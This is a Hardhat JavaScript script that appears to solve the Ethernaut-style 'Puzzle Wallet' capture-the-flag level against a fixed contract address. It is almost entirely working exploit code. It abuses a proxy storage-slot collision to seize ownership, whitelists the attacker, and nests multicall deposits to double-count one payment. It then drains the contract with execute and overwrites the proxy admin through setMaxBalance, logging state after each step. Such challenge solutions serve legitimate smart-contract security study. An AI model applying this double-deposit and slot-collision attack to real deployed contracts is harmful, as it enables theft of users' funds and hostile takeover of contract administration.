const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    // Get contracts
    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");

    const wallet = PuzzleWallet.attach(instance_address);
    const proxy = PuzzleProxy.attach(instance_address);

    console.log(`Proxy Admin: ${await proxy.admin()}`);
    console.log(`Proxy Pending Admin: ${await proxy.pendingAdmin()}`);
    console.log(`Wallet Owner: ${await wallet.owner()}`);
    console.log(`Wallet Max Balance: ${await wallet.maxBalance()}`);
    console.log(`Wallet Whitelisted Account: ${await wallet.whitelisted(account.address)}`);
    console.log(`Puzzle Balance: ${await ethers.provider.getBalance(instance_address)}`);
    console.log(`Account Balance: ${await  wallet.balances(account.address)}`);

    let balance = await ethers.provider.getBalance(instance_address);

    console.log("Proposing New Admin...");
    let tx = await proxy.proposeNewAdmin(account.address);
    await tx.wait(10);

    console.log(`Proxy Admin: ${await proxy.admin()}`);
    console.log(`Proxy Pending Admin: ${await proxy.pendingAdmin()}`);
    console.log(`Wallet Owner: ${await wallet.owner()}`);
    console.log(`Wallet Max Balance: ${await wallet.maxBalance()}`);
    console.log(`Wallet Whitelisted Account: ${await wallet.whitelisted(account.address)}`);
    console.log(`Puzzle Balance: ${await ethers.provider.getBalance(instance_address)}`);
    console.log(`Account Balance: ${await  wallet.balances(account.address)}`);

    // console.log("Adding to whitelist...")
    tx = await wallet.addToWhitelist(account.address);
    await tx.wait(10);

    console.log(`Proxy Admin: ${await proxy.admin()}`);
    console.log(`Proxy Pending Admin: ${await proxy.pendingAdmin()}`);
    console.log(`Wallet Owner: ${await wallet.owner()}`);
    console.log(`Wallet Max Balance: ${await wallet.maxBalance()}`);
    console.log(`Wallet Whitelisted Account: ${await wallet.whitelisted(account.address)}`);
    console.log(`Puzzle Balance: ${await ethers.provider.getBalance(instance_address)}`);
    console.log(`Account Balance: ${await  wallet.balances(account.address)}`);

    // Multicall!
    console.log("Multicall...");

    let ABI = ["function deposit()"];
    let iface = new ethers.utils.Interface(ABI);
    let cd = iface.encodeFunctionData("deposit");
    
    let ABI_mc = ["function multicall(bytes[] calldata)"];
    let iface_mc = new ethers.utils.Interface(ABI_mc);
    let cd_mc = iface_mc.encodeFunctionData("multicall", [[cd]]);

    tx = await wallet.multicall([cd_mc, cd_mc], {value: balance});
    await tx.wait(10);

    console.log(`Proxy Admin: ${await proxy.admin()}`);
    console.log(`Proxy Pending Admin: ${await proxy.pendingAdmin()}`);
    console.log(`Wallet Owner: ${await wallet.owner()}`);
    console.log(`Wallet Max Balance: ${await wallet.maxBalance()}`);
    console.log(`Wallet Whitelisted Account: ${await wallet.whitelisted(account.address)}`);
    console.log(`Puzzle Balance: ${await ethers.provider.getBalance(instance_address)}`);
    console.log(`Account Balance: ${await  wallet.balances(account.address)}`);

    // Drain funds from contract
    console.log('Calling execute...');
    tx = await wallet.execute(account.address, await ethers.provider.getBalance(wallet.address), 0x0);
    await tx.wait(10);

    console.log(`Proxy Admin: ${await proxy.admin()}`);
    console.log(`Proxy Pending Admin: ${await proxy.pendingAdmin()}`);
    console.log(`Wallet Owner: ${await wallet.owner()}`);
    console.log(`Wallet Max Balance: ${await wallet.maxBalance()}`);
    console.log(`Wallet Whitelisted Account: ${await wallet.whitelisted(account.address)}`);
    console.log(`Puzzle Balance: ${await ethers.provider.getBalance(instance_address)}`);
    console.log(`Account Balance: ${await  wallet.balances(account.address)}`);

    // Set max balance which will change admin
    console.log('Calling setMaxBalance...');
    tx = await wallet.setMaxBalance(account.address);
    await tx.wait(10);

    console.log(`Proxy Admin: ${await proxy.admin()}`);
    console.log(`Proxy Pending Admin: ${await proxy.pendingAdmin()}`);
    console.log(`Wallet Owner: ${await wallet.owner()}`);
    console.log(`Wallet Max Balance: ${await wallet.maxBalance()}`);
    console.log(`Wallet Whitelisted Account: ${await wallet.whitelisted(account.address)}`);
    console.log(`Puzzle Balance: ${await ethers.provider.getBalance(instance_address)}`);
    console.log(`Account Balance: ${await  wallet.balances(account.address)}`);

    console.log('Success!')

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x8189dcBD27AAcF0686D5FA75712A7306B7807565';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
